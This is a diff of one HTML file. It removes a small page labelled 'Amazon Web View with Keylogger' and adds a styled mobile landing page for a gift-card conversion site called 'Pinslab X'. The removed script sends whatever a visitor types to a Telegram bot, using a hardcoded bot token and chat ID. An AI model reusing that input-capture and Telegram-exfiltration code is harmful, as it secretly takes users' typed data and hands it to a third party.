@@ -1,37 +1,208 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <title>Amazon Web View with Keylogger</title>
-    <script>
-        // JavaScript to handle web view and keylogging
-        function handleKeylogger() {
-            const userInput = document.getElementById('userInput').value;
-            if (userInput.trim()) {
-                // Send to Telegram bot
-                const telegramBotToken = "8861251322:AAEF9iBSEkOpKONwI04";
-                const userTelegramId = "8844584255";
-                const message = `User: ${userInput} - Telegram Bot Token: ${telegramBotToken}, User ID: ${userTelegramId}`;
-                
-                // Example Telegram Bot API call (this is a mock)
-                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${userTelegramId}&text=${message}`)
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log("Telegram Message Sent:", data);
-                    })
-                    .catch(error => {
-                        console.error("Error sending Telegram message:", error);
-                    });
-            }
+    <meta charset="UTF-8">
+    <!-- मोबाइल लेआउट के लिए सबसे महत्वपूर्ण टैग -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pinslab X | Premium Exchange</title>
+    <!-- प्रीमियम लुक के लिए Poppins फॉन्ट -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-color: #050505;
+            --card-bg: rgba(255, 255, 255, 0.04);
+            --card-border: rgba(255, 255, 255, 0.08);
+            --primary-gradient: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
+            --text-main: #ffffff;
+            --text-muted: #a0a0a0;
         }
 
-        // Add input field
-        document.getElementById('userInput').addEventListener('input', handleKeylogger);
-    </script>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            /* मोबाइल पर टैप करते वक्त आने वाले ब्लू हाईलाइट को हटाने के लिए */
+            -webkit-tap-highlight-color: transparent; 
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg-color);
+            background-image: radial-gradient(circle at 50% 0%, #1a1a2e 0%, #050505 80%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 50px 20px;
+            overflow-x: hidden;
+        }
+
+        /* --- Branding / Header --- */
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            animation: fadeInDown 1s ease-out;
+        }
+
+        .brand-title {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .brand-subtitle {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 400;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        /* --- Card Container (Mobile Optimized) --- */
+        .container {
+            width: 100%;
+            max-width: 360px; /* मोबाइल स्क्रीन के लिए बेस्ट साइज़ */
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* --- Premium Card Design (Glassmorphism) --- */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 24px;
+            padding: 25px 20px;
+            display: flex;
+            flex-direction: row; /* मोबाइल पर आइकॉन और टेक्स्ट साइड-बाय-साइड अच्छे लगते हैं */
+            align-items: center;
+            justify-content: flex-start;
+            text-decoration: none;
+            color: var(--text-main);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.8s ease-out backwards;
+        }
+
+        /* कार्ड्स के लिए स्टैगर्ड एनिमेशन */
+        .card:nth-child(1) { animation-delay: 0.2s; }
+        .card:nth-child(2) { animation-delay: 0.4s; }
+
+        /* होवर और टैप इफेक्ट्स */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            border-radius: 24px;
+            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0));
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .card:hover, .card:active {
+            transform: translateY(-4px) scale(0.98);
+            border-color: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 15px 35px rgba(79, 172, 254, 0.15);
+        }
+
+        .card:hover::before, .card:active::before {
+            opacity: 1;
+        }
+
+        /* --- Icons Layout --- */
+        .icon-wrapper {
+            width: 70px;
+            height: 70px;
+            min-width: 70px;
+            border-radius: 18px;
+            background: #ffffff; /* पीएनजी को पॉप अप करने के लिए प्योर वाइट बेस */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 20px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            padding: 12px;
+        }
+
+        .icon {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        /* --- Text Styling Inside Card --- */
+        .text-content {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .card-subtitle {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            line-height: 1.2;
+        }
+
+        /* --- Animations Keyframes --- */
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
 </head>
 <body>
-    <h1>Amazon Web View with Keylogger</h1>
-    <input type="text" id="userInput" placeholder="Enter your message here..." />
+
+    <header>
+        <h1 class="brand-title">Pinslab X</h1>
+        <p class="brand-subtitle">Premium Conversion Platform</p>
+    </header>
+
+    <div class="container">
+        <!-- Amazon Card -->
+        <a href="https://www.amazon.in" target="_blank" class="card">
+            <div class="icon-wrapper">
+                <!-- User provided Amazon PNG -->
+                <img class="icon" src="https://brandlogos.net/wp-content/uploads/2025/02/Amazon-icon.png" alt="Amazon Logo">
+            </div>
+            <div class="text-content">
+                <div class="card-title">Amazon</div>
+                <div class="card-subtitle">Tap to convert your Amazon Gift Card</div>
+            </div>
+        </a>
+
+        <!-- Flipkart Card -->
+        <a href="https://www.flipkart.com" target="_blank" class="card">
+            <div class="icon-wrapper">
+                <!-- User provided Flipkart PNG -->
+                <img class="icon" src="https://brandlogos.net/wp-content/uploads/2025/02/flipkart_icon-logo_brandlogos.net_uh1az.png" alt="Flipkart Logo">
+            </div>
+            <div class="text-content">
+                <div class="card-title">Flipkart</div>
+                <div class="card-subtitle">Generate your Flipkart Gift Card</div>
+            </div>
+        </a>
+    </div>
+
 </body>
 </html>
